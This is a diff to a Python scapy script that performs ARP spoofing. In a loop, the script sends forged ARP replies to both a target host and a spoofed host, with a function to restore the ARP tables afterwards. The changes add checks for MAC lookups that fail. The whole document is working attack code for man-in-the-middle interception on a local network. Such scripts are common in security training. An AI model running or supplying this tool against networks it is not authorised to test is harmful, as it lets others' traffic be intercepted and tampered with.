@@ -6,8 +6,11 @@ def get_mac(ip):
     broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
-    
-    return answered_list[0][1].hwsrc
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        print(f"[-] MAC address for {ip} not found.\n")
+        return None
 
 def get_arguments():
     parser = optparse.OptionParser()
@@ -20,12 +23,17 @@ def get_arguments():
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst = target_ip, hwdst=target_mac, psrc = spoof_ip)
-    return packet
-
+    if target_mac:
+        packet = scapy.ARP(op=2, pdst = target_ip, hwdst=target_mac, psrc = spoof_ip)
+        return packet
+    else:
+        return None
 def send_packet(packet):
-    scapy.send(packet, verbose = False)
-
+    if packet:
+        scapy.send(packet, verbose = False)
+    else:
+        print(f"[-] Packet is None. Packet not sent.\n")
+        return
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
@@ -38,8 +46,14 @@ def main():
     packet_sents = 0
     try:
         while True:
-            send_packet(spoof(options.target, options.spoof))
-            send_packet(spoof(options.spoof, options.target))
+            if get_mac(options.target):
+                send_packet(spoof(options.target, options.spoof))
+            else:
+                return
+            if get_mac(options.spoof):
+                send_packet(spoof(options.spoof, options.target))
+            else:
+                return
             packet_sents += 2
             print(f"\r[+] {packet_sents} packet sents", end = "")
             time.sleep(2)
